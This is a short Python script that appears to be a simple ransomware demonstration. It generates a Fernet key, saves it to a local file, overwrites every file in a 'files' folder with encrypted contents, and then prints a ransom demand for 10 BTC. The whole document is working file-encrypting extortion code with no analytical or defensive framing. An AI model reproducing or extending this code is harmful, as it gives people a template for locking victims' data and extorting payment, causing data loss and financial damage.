import os
from cryptography.fernet import Fernet

DEFAULT_PATH = "files"

# * Generate a secret key
with open("secretkey.key", mode="wb") as key_file:
    secret_key = Fernet.generate_key()
    # print(secret_key)
    key_file.write(secret_key)

# * Encryption
for f in os.listdir(path=DEFAULT_PATH):
    with open(file=f"{DEFAULT_PATH}/{f}", mode="rb") as file:
        contents = file.read()
        # print(contents)
        content_enc = Fernet(secret_key).encrypt(contents)
        # print(content_enc)
    with open(file=f"{DEFAULT_PATH}/{f}", mode="wb") as file:
        file.write(content_enc)

print("All your files have been encrypted. If you want it back, send me 10 BTC or I'll delete it :)")
